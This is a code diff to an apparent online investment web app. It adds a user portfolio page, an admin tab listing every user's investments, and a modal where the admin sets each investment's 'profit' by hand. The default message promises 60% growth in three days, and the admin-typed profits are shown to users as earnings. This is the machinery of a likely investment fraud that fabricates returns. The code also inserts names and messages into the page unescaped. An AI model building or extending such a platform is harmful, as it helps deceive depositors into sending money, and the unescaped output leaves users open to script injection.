@@ -800,6 +800,48 @@
             transform: translateX(24px);
         }
 
+        /* ===== INVESTMENT CARD ===== */
+        .investment-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--gray-200);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .investment-details h4 {
+            color: var(--gray-900);
+            margin-bottom: 5px;
+        }
+
+        .investment-details p {
+            color: var(--gray-500);
+            font-size: 0.9rem;
+        }
+
+        .investment-profit {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--success);
+        }
+
+        .investment-message {
+            background: var(--primary-soft);
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 20px;
+            color: var(--gray-800);
+            font-size: 1rem;
+            text-align: center;
+            border-left: 4px solid var(--primary);
+        }
+
         /* ===== WITHDRAW SECTION ===== */
         .withdraw-info {
             background: var(--gray-50);
@@ -862,6 +904,33 @@
 
         .user-list-item:last-child {
             border-bottom: none;
+        }
+
+        .investment-item-admin {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid var(--gray-200);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .investment-item-admin:last-child {
+            border-bottom: none;
+        }
+
+        .profit-edit {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .profit-edit input {
+            width: 100px;
+            padding: 5px;
+            border: 1px solid var(--gray-300);
+            border-radius: 6px;
         }
 
         .promo-editor textarea {
@@ -954,6 +1023,11 @@
             
             .stat-number {
                 font-size: 2rem;
+            }
+            
+            .investment-card {
+                flex-direction: column;
+                align-items: flex-start;
             }
         }
 
@@ -1304,6 +1378,7 @@
                     <li><a href="#" data-page="wallet"><i class="fas fa-wallet"></i> Fund Wallet</a></li>
                     <li><a href="#" data-page="withdraw"><i class="fas fa-money-bill-wave"></i> Withdraw</a></li>
                     <li><a href="#" data-page="referral"><i class="fas fa-users"></i> Referrals</a></li>
+                    <li><a href="#" data-page="portfolio"><i class="fas fa-chart-pie"></i> Portfolio</a></li>
                     <li><a href="#" data-page="settings"><i class="fas fa-cog"></i> Settings</a></li>
                     <li><a href="#" id="adminPanelBtn" style="display: none;"><i class="fas fa-user-shield"></i> Admin</a></li>
                 </ul>
@@ -1327,8 +1402,8 @@
                             <div class="value" id="activeInvestments">0</div>
                         </div>
                         <div class="stat-card">
-                            <h3>Referral Earnings</h3>
-                            <div class="value"><span id="userCurrency2">$</span><span id="referralEarnings">0.00</span></div>
+                            <h3>Total Profit</h3>
+                            <div class="value"><span id="userCurrency2">$</span><span id="totalProfit">0.00</span></div>
                         </div>
                     </div>
                     
@@ -1422,6 +1497,16 @@
                     </div>
                 </div>
                 
+                <!-- Portfolio Section (Active Investments) -->
+                <div id="portfolioSection" class="dashboard-section">
+                    <h2>Your Active Investments</h2>
+                    <div id="activeInvestmentsList"></div>
+                    <div class="investment-message" id="investmentMessage">
+                        <!-- Loaded from Firestore -->
+                        Your investment will grow with 60% in the next 3 days.
+                    </div>
+                </div>
+                
                 <!-- Settings Section -->
                 <div id="settingsSection" class="dashboard-section">
                     <h2>Account Settings</h2>
@@ -1484,6 +1569,7 @@
                 <button class="btn btn-outline" onclick="showAdminTab('users')">Users</button>
                 <button class="btn btn-outline" onclick="showAdminTab('deposits')">Pending Deposits</button>
                 <button class="btn btn-outline" onclick="showAdminTab('withdrawals')">Withdrawals</button>
+                <button class="btn btn-outline" onclick="showAdminTab('investments')">Active Investments</button>
                 <button class="btn btn-outline" onclick="showAdminTab('settings')">Site Settings</button>
             </div>
 
@@ -1507,6 +1593,17 @@
                     <h4>Withdrawal Instructions (Editable)</h4>
                     <textarea id="withdrawalInstructionsInput" rows="4" class="form-control" placeholder="Enter instructions that users will see when withdrawing..."></textarea>
                     <button class="btn btn-primary mt-2" onclick="saveWithdrawalInstructions()">Save Instructions</button>
+                </div>
+            </div>
+
+            <!-- Investments Tab -->
+            <div id="investmentsTab" class="admin-card" style="display: none;">
+                <h3>All Active Investments</h3>
+                <div id="adminInvestmentsList"></div>
+                <div class="mt-2">
+                    <h4>Investment Message (Editable)</h4>
+                    <textarea id="investmentMessageInput" rows="3" class="form-control" placeholder="E.g., Your investment will grow with 60% in the next 3 days"></textarea>
+                    <button class="btn btn-primary mt-2" onclick="saveInvestmentMessage()">Save Message</button>
                 </div>
             </div>
 
@@ -1562,6 +1659,34 @@
                     <input type="number" id="editNewBalance" class="form-control" step="0.01" required>
                 </div>
                 <button type="submit" class="btn btn-primary w-100">Update Balance</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Edit Investment Profit Modal -->
+    <div class="modal" id="editProfitModal">
+        <div class="modal-content">
+            <h3>Edit Investment Profit</h3>
+            <form id="editProfitForm">
+                <input type="hidden" id="editInvestmentId">
+                <input type="hidden" id="editInvestmentUserId">
+                <div class="form-group">
+                    <label>User</label>
+                    <input type="text" id="editInvestmentUser" class="form-control" readonly>
+                </div>
+                <div class="form-group">
+                    <label>Plan</label>
+                    <input type="text" id="editInvestmentPlan" class="form-control" readonly>
+                </div>
+                <div class="form-group">
+                    <label>Invested Amount</label>
+                    <input type="text" id="editInvestmentAmount" class="form-control" readonly>
+                </div>
+                <div class="form-group">
+                    <label>Current Profit</label>
+                    <input type="number" id="editInvestmentProfit" class="form-control" step="0.01" required>
+                </div>
+                <button type="submit" class="btn btn-primary w-100">Update Profit</button>
             </form>
         </div>
     </div>
@@ -1708,7 +1833,7 @@
                 role: 'user',
                 twoFactorEnabled: false,
                 deposits: [],
-                investments: [],
+                investments: [], // each investment will have { plan, amount, date, profit }
                 withdrawalRequests: [],
                 referralCode: 'ACT' + Math.random().toString(36).substring(2, 8).toUpperCase(),
                 referralEarnings: 0,
@@ -1780,7 +1905,12 @@
             
             document.getElementById('userName').textContent = currentUser.name;
             document.getElementById('totalBalance').textContent = (currentUser.balance || 0).toFixed(2);
-            document.getElementById('referralEarnings').textContent = (currentUser.referralEarnings || 0).toFixed(2);
+            
+            // Calculate total profit from investments
+            const totalProfit = (currentUser.investments || []).reduce((sum, inv) => sum + (inv.profit || 0), 0);
+            document.getElementById('totalProfit').textContent = totalProfit.toFixed(2);
+            document.getElementById('activeInvestments').textContent = (currentUser.investments || []).length;
+            
             document.getElementById('userReferralCode').textContent = currentUser.referralCode || 'N/A';
             
             const symbol = currencySymbols[currentUser.currency] || '$';
@@ -1788,6 +1918,35 @@
             
             document.getElementById('profileName').value = currentUser.name || '';
             document.getElementById('profileCurrency').value = currentUser.currency || 'USD';
+            
+            // Load active investments in portfolio section
+            loadActiveInvestments();
+        }
+
+        // ===== LOAD ACTIVE INVESTMENTS FOR USER =====
+        async function loadActiveInvestments() {
+            if (!currentUser || !currentUser.investments) return;
+            const container = document.getElementById('activeInvestmentsList');
+            if (currentUser.investments.length === 0) {
+                container.innerHTML = '<p>You have no active investments. Start investing now!</p>';
+                return;
+            }
+            const symbol = currencySymbols[currentUser.currency] || '$';
+            let html = '';
+            currentUser.investments.forEach((inv, index) => {
+                html += `
+                    <div class="investment-card">
+                        <div class="investment-details">
+                            <h4>${inv.plan} Plan</h4>
+                            <p>Invested: ${symbol}${inv.amount} on ${new Date(inv.date).toLocaleDateString()}</p>
+                        </div>
+                        <div class="investment-profit">
+                            Profit: ${symbol}${(inv.profit || 0).toFixed(2)}
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
         }
 
         // ===== DEPOSIT =====
@@ -1851,20 +2010,26 @@
             }
 
             const newBalance = currentUser.balance - amount;
-            await db.collection('users').doc(currentUser.id).update({
-                balance: newBalance
-            });
-
-            await db.collection('investments').add({
-                userId: currentUser.id,
-                userName: currentUser.name,
+            
+            // Create investment object
+            const investment = {
                 plan,
                 amount,
-                status: 'active',
-                date: new Date().toISOString()
+                date: new Date().toISOString(),
+                profit: 0 // initial profit
+            };
+
+            // Update user's investments array
+            const investments = currentUser.investments || [];
+            investments.push(investment);
+            
+            await db.collection('users').doc(currentUser.id).update({
+                balance: newBalance,
+                investments: investments
             });
 
             currentUser.balance = newBalance;
+            currentUser.investments = investments;
             updateUserUI();
             
             showToast(`Successfully invested $${amount} in ${plan} Plan!`, 'success', 'Investment Successful');
@@ -1923,6 +2088,7 @@
             document.getElementById('usersTab').style.display = 'none';
             document.getElementById('depositsTab').style.display = 'none';
             document.getElementById('withdrawalsTab').style.display = 'none';
+            document.getElementById('investmentsTab').style.display = 'none';
             document.getElementById('settingsTab').style.display = 'none';
             
             if (tab === 'users') {
@@ -1986,6 +2152,42 @@
                 }
             }
 
+            if (tab === 'investments') {
+                document.getElementById('investmentsTab').style.display = 'block';
+                // Load all users' investments
+                const users = await db.collection('users').get();
+                let html = '';
+                for (const userDoc of users.docs) {
+                    const u = userDoc.data();
+                    if (u.investments && u.investments.length > 0) {
+                        u.investments.forEach((inv, index) => {
+                            html += `
+                                <div class="investment-item-admin">
+                                    <div>
+                                        <strong>${u.name}</strong> (${u.email})<br>
+                                        Plan: ${inv.plan} - Invested: $${inv.amount} on ${new Date(inv.date).toLocaleDateString()}
+                                    </div>
+                                    <div class="profit-edit">
+                                        Profit: $<span id="profit-${userDoc.id}-${index}">${(inv.profit || 0).toFixed(2)}</span>
+                                        <button class="btn btn-primary btn-sm" onclick="openEditProfitModal('${userDoc.id}', ${index}, '${u.name}', '${inv.plan}', ${inv.amount}, ${inv.profit || 0})">Edit</button>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                    }
+                }
+                if (html === '') html = '<p>No active investments found.</p>';
+                document.getElementById('adminInvestmentsList').innerHTML = html;
+
+                // Load investment message
+                const msgDoc = await db.collection('settings').doc('investmentMessage').get();
+                if (msgDoc.exists) {
+                    document.getElementById('investmentMessageInput').value = msgDoc.data().message || '';
+                } else {
+                    document.getElementById('investmentMessageInput').value = 'Your investment will grow with 60% in the next 3 days.';
+                }
+            }
+
             if (tab === 'settings') {
                 document.getElementById('settingsTab').style.display = 'block';
                 const promoDoc = await db.collection('settings').doc('promo').get();
@@ -2034,10 +2236,60 @@
             showAdminTab('withdrawals');
         };
 
+        window.openEditProfitModal = (userId, investmentIndex, userName, plan, amount, currentProfit) => {
+            document.getElementById('editInvestmentId').value = userId; // we'll use userId and index to identify
+            document.getElementById('editInvestmentUserId').value = userId;
+            document.getElementById('editInvestmentUser').value = userName;
+            document.getElementById('editInvestmentPlan').value = plan;
+            document.getElementById('editInvestmentAmount').value = amount;
+            document.getElementById('editInvestmentProfit').value = currentProfit;
+            // Store index in a data attribute or global var
+            window.currentEditInvestmentIndex = investmentIndex;
+            showModal('editProfitModal');
+        };
+
+        document.getElementById('editProfitForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const userId = document.getElementById('editInvestmentUserId').value;
+            const newProfit = parseFloat(document.getElementById('editInvestmentProfit').value);
+            const index = window.currentEditInvestmentIndex;
+
+            // Get user
+            const userRef = db.collection('users').doc(userId);
+            const userDoc = await userRef.get();
+            const userData = userDoc.data();
+            if (!userData.investments || !userData.investments[index]) {
+                showToast('Investment not found', 'error', 'Error');
+                return;
+            }
+
+            // Update profit
+            userData.investments[index].profit = newProfit;
+            await userRef.update({ investments: userData.investments });
+
+            // If this is the current user, update local
+            if (currentUser && currentUser.id === userId) {
+                currentUser.investments = userData.investments;
+                updateUserUI();
+            }
+
+            showToast('Investment profit updated!', 'success', 'Admin Action');
+            closeModal('editProfitModal');
+            showAdminTab('investments');
+        });
+
         window.saveWithdrawalInstructions = async () => {
             const instructions = document.getElementById('withdrawalInstructionsInput').value;
             await db.collection('settings').doc('withdrawals').set({ instructions });
             showToast('Withdrawal instructions saved.', 'success', 'Admin Action');
+        };
+
+        window.saveInvestmentMessage = async () => {
+            const message = document.getElementById('investmentMessageInput').value;
+            await db.collection('settings').doc('investmentMessage').set({ message });
+            showToast('Investment message saved.', 'success', 'Admin Action');
+            // Update display if on user dashboard
+            document.getElementById('investmentMessage').innerHTML = message;
         };
 
         window.savePromoBanner = async () => {
@@ -2067,6 +2319,16 @@
             }
         }
 
+        // ===== LOAD INVESTMENT MESSAGE =====
+        async function loadInvestmentMessage() {
+            const msgDoc = await db.collection('settings').doc('investmentMessage').get();
+            if (msgDoc.exists) {
+                document.getElementById('investmentMessage').innerHTML = msgDoc.data().message;
+            } else {
+                document.getElementById('investmentMessage').innerHTML = 'Your investment will grow with 60% in the next 3 days.';
+            }
+        }
+
         // ===== COPY REFERRAL CODE =====
         window.copyReferralCode = () => {
             navigator.clipboard.writeText(document.getElementById('userReferralCode').textContent);
@@ -2085,6 +2347,7 @@
                         document.getElementById('adminPanelBtn').style.display = 'block';
                     }
                     loadWithdrawalInstructions();
+                    loadInvestmentMessage();
                 } else {
                     // Invalid user ID, clear storage
                     localStorage.removeItem('currentUserId');
@@ -2190,6 +2453,11 @@
                     loadWithdrawalInstructions();
                 }
                 if (page === 'referral') document.getElementById('referralSection').classList.add('active');
+                if (page === 'portfolio') {
+                    document.getElementById('portfolioSection').classList.add('active');
+                    loadActiveInvestments();
+                    loadInvestmentMessage();
+                }
                 if (page === 'settings') document.getElementById('settingsSection').classList.add('active');
             });
         });
